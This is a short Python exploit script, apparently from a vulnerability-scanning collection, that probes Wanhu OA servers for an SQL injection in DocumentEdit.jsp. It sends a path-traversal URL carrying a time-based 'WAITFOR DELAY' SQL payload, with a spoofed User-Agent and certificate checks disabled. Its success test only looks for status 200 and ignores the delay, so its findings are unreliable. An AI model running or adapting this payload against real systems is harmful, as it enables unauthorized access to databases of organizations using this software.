import sys
import requests
import urllib3
import time
from rich.console import Console


console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    target_url = target_url + "defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:5'--"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    success_msg = now_time() + '[SUCCESS]存在万户OA DocumentEdit.jsp SQL注入漏洞'
    shell_msg = now_time() + '{}'.format(target_url)
    warning_msg = now_time() + '[WARNING]不存在万户OA DocumentEdit.jsp SQL注入漏洞'
    error_msg = now_time() + '[万户OA DocumentEdit.jsp SQL注入漏洞][ERROR]目标请求失败'
    try:
        res = requests.get(url=target_url, headers=headers, verify=False, timeout=10)
        if res.status_code == 200:
            return success_msg,shell_msg
        else:
            return warning_msg
    except:
        return error_msg



